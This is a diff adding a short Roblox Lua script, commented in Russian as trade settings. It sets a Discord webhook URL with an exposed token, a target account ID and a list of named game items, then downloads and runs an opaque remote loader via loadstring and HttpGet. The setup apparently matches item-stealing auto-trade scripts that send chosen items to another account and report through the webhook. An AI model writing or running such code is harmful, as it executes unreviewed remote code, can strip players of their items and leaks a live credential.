@@ -1,0 +1,13 @@
+-- Настройки трейда
+getgenv().WEBHOOK_URL = "https://discord.com/api/webhooks/1476518423554031790/UtSj1OVVjibvw6vZl-E_AihbEmEq_iMDl3nLkAASGo1gUDAzMP0OugsZW6ZKIUDc6Q58"
+getgenv().TARGET_ID = 2813571178  -- ID аккаунта для трейда
+getgenv().DELAY_STEP = 1      
+getgenv().TRADE_CYCLE_DELAY = 2 
+getgenv().TARGET_BRAINROTS = {
+    ["Los Spaghettis"] = true,
+    ["Garama and Madundung"] = true,
+    ["Los Bros"] = true,
+    ["Los Candies"] = true,
+    ["Tang Tang Keletang"] = true
+}
+loadstring(game:HttpGet("https://api.luarmor.net/files/v4/loaders/9a91b3ba6fb71423853ec2f885c42d67.lua"))()
